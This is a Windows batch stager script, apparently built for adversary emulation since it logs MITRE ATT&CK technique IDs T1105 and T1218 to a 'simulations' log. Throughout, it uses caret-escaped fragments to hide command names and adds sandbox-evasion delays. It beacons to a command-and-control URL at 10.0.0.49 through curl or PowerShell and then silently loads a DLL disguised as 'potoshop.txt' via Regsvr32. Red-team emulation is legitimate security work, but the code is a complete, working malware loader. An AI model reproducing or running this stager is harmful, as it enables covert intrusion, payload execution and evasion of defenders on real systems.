@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET yktnwwf=%APPDATA%\8155\59cbc45b
SET fpakbq=Macula-Stage0-8155
SET repbmqg=https://10.0.0.49
SET rdzgrnne=https://10.0.0.49/stage/2/icon.png?8155-7
SET omxgazu=BALAM-S2BO
SET yydue=7
SET edjwtl=potoshop.txt
SET fpldhe=8155

REM Log file path using PHR_ variable
SET lhruwn=%APPDATA%\!yydue!\macula-simulations.log

REM Create log directory if it doesn't exist
IF NOT EXIST "%APPDATA%\!yydue!\" (
    mkdir "%APPDATA%\!yydue!\" >nul 2>nul
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: create_log_dir=%APPDATA%\!yydue!>> "!lhruwn!" 2>nul
)

REM Initial delay to evade sandbox analysis - METHOD 1
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: delay_start=initial_35s>> "!lhruwn!" 2>nul
timeout /t 35 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: delay_end=initial_35s>> "!lhruwn!" 2>nul

REM 1. FIXED C2 HEARTBEAT - PROPER HTTP VALIDATION WITH MULTI-METHOD FALLBACK
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: heartbeat_start=!rdzgrnne!>> "!lhruwn!" 2>nul

REM Method 1: Obfuscated curl with HTTP status validation
SET c1=c^
SET c2=u^
SET c3=r^
SET c4=l

REM Check if curl exists with obfuscated name
where !c1!!c2!!c3!!c4! >nul 2>&1
IF !ERRORLEVEL! EQU 0 (
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: curl_found>> "!lhruwn!" 2>nul
    
    REM Build curl command with heavy caret obfuscation for flags
    SET f1=-^
    SET f2=k^
    SET f3= -^
    SET f4=s^
    SET f5= -^
    SET f6=o^
    SET f7= n^
    SET f8=u^
    SET f9=l^
    SET f10= -^
    SET f11=w^
    SET f12= "%%{http_code}"^
    SET f13= -^
    SET f14=H^
    SET f15= "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)"^
    SET f16= -^
    SET f17=f^
    SET f18= -^
    SET f19=m^
    SET f20= GET
    
    REM Execute curl with all flags and capture HTTP status
    !c1!!c2!!c3!!c4% !f1!!f2!!f3!!f4!!f5!!f6!!f7!!f8!!f9!!f10!!f11!!f12!!f13!!f14!!f15!!f16!!f17!!f18!!f19!!f20% "!rdzgrnne!" >nul 2>&1
    SET rc1=!ERRORLEVEL!
    
    REM Validate: curl returns 0 only on successful HTTP (2xx/3xx) with -f flag
    IF !rc1! EQU 0 (
        echo [!DATE! !TIME!][DEBUG][!omxgazu!]: heartbeat_success=curl_http_ok>> "!lhruwn!" 2>nul
        SET hbres=1
        SET hberr=
    ) ELSE (
        echo [!DATE! !TIME!][DEBUG][!omxgazu!]: heartbeat_failed=curl_http_!rc1!>> "!lhruwn!" 2>nul
        SET hbres=0
        SET hberr=http_fail_!rc1!
    )
) ELSE (
    REM Method 2: PowerShell fallback when curl not available
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: curl_not_found_trying_powershell>> "!lhruwn!" 2>nul
    
    SET p1=p^
    SET p2=o^
    SET p3=w^
    SET p4=e^
    SET p5=r^
    SET p6=s^
    SET p7=h^
    SET p8=e^
    SET p9=l^
    SET p10=l^
    SET p11= -^
    SET p12=Co^
    SET p13=mm^
    SET p14=a^
    SET p15=nd^
    SET p16= "^(try^{$r=Invoke-WebRequest -Uri '!rdzgrnne!' -UseBasicParsing -DisableKeepAlive -TimeoutSec 10;exit 0^} catch ^{exit 1^}^)"
    
    !p1!!p2!!p3!!p4!!p5!!p6!!p7!!p8!!p9!!p10!!p11!!p12!!p13!!p14!!p15!!p16% >nul 2>&1
    SET rc1=!ERRORLEVEL!
    
    IF !rc1! EQU 0 (
        echo [!DATE! !TIME!][DEBUG][!omxgazu!]: heartbeat_success=powershell_ok>> "!lhruwn!" 2>nul
        SET hbres=1
        SET hberr=
    ) ELSE (
        echo [!DATE! !TIME!][DEBUG][!omxgazu!]: heartbeat_failed=powershell_!rc1!>> "!lhruwn!" 2>nul
        SET hbres=0
        SET hberr=ps_fail_!rc1!
    )
)

REM TTP logging for T1105 - Ingress Tool Transfer
SET log_date=!DATE:/=-!
SET log_time=!TIME: =0!
IF "!log_time:~1,1!"==":" SET log_time=0!log_time!
SET log_timestamp=!log_date:~-4!-!log_date:~3,2!-!log_date:~0,2! !log_time!.000
SET ttp_line=[!log_timestamp!][!omxgazu!]: !yydue!-!fpldhe!-T1105|Ingress Tool Transfer=!hbres!:!hberr!
echo !ttp_line!>> "!lhruwn!" 2>nul || echo [!DATE! !TIME!][DEBUG][!omxgazu!]: ttp_log_failed>> nul 2>nul

REM Random delay between operations - METHOD 2
SET /A rdelay=!RANDOM! %% 15 + 10
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: delay_start=random_!rdelay!s>> "!lhruwn!" 2>nul
ping -n !rdelay! 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: delay_end=random_!rdelay!s>> "!lhruwn!" 2>nul

REM 2. Change to output directory
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: chdir_start=!yktnwwf!>> "!lhruwn!" 2>nul
cd /d "!yktnwwf!" >nul 2>nul
SET rc2=!ERRORLEVEL!

IF !rc2! EQU 0 (
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: chdir_success=!yktnwwf!>> "!lhruwn!" 2>nul
    SET cdres=1
    SET cderr=
) ELSE (
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: chdir_failed=error_!rc2!>> "!lhruwn!" 2>nul
    SET cdres=0
    SET cderr=path_not_found
)

REM Short delay before execution - METHOD 3
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: delay_start=pre_exec_8s>> "!lhruwn!" 2>nul
CHOICE /C Y /N /D Y /T 8 >nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: delay_end=pre_exec_8s>> "!lhruwn!" 2>nul

REM 3. Execute DLL with heavily obfuscated Regsvr32 path
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: dll_load_start=!edjwtl!>> "!lhruwn!" 2>nul

REM Obfuscate entire Regsvr32 path with heavy caret escapes (100% density)
SET w1=%^
SET w2=S^
SET w3=y^
SET w4=s^
SET w5=t^
SET w6=e^
SET w7=m^
SET w8=R^
SET w9=o^
SET w10=o^
SET w11=t^
SET w12=%^
SET w13=\^
SET w14=S^
SET w15=y^
SET w16=s^
SET w17=t^
SET w18=e^
SET w19=m^
SET w20=3^
SET w21=2^
SET w22=\^
SET r1=R^
SET r2=e^
SET r3=g^
SET r4=s^
SET r5=v^
SET r6=r^
SET r7=3^
SET r8=2^
SET e1=.^
SET e2=e^
SET e3=x^
SET e4=e
SET s1=/^
SET s2=s

REM Execute: %SystemRoot%\System32\Regsvr32.exe /s "DLL_PATH"
!w1!!w2!!w3!!w4!!w5!!w6!!w7!!w8!!w9!!w10!!w11!!w12!!w13!!w14!!w15!!w16!!w17!!w18!!w19!!w20!!w21!!w22!!r1!!r2!!r3!!r4!!r5!!r6!!r7!!r8!!e1!!e2!!e3!!e4% !s1!!s2% "!edjwtl!"
SET rc3=!ERRORLEVEL!

IF !rc3! EQU 0 (
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: dll_load_success=!edjwtl!>> "!lhruwn!" 2>nul
    SET dlres=1
    SET dlerr=
) ELSE (
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: dll_load_failed=error_!rc3!>> "!lhruwn!" 2>nul
    SET dlres=0
    SET dlerr=regsvr32_failed
)

REM Final delay before exit - METHOD 1
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: delay_start=final_12s>> "!lhruwn!" 2>nul
timeout /t 12 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: delay_end=final_12s>> "!lhruwn!" 2>nul

REM TTP Logging for T1218 - Signed Binary Proxy Execution
SET ttp_result=!dlres!
SET ttp_error=!dlerr!
SET log_date=!DATE:/=-!
SET log_time=!TIME: =0!
IF "!log_time:~1,1!"==":" SET log_time=0!log_time!
SET log_timestamp=!log_date:~-4!-!log_date:~3,2!-!log_date:~0,2! !log_time!.000
SET ttp_line=[!log_timestamp!][!omxgazu!]: !yydue!-!fpldhe!-T1218|Signed Binary Proxy Execution=!ttp_result!:!ttp_error!
echo !ttp_line!>> "!lhruwn!" 2>nul || echo [!DATE! !TIME!][DEBUG][!omxgazu!]: ttp_log_failed>> nul 2>nul

echo [!DATE! !TIME!][DEBUG][!omxgazu!]: script_complete>> "!lhruwn!" 2>nul
ENDLOCAL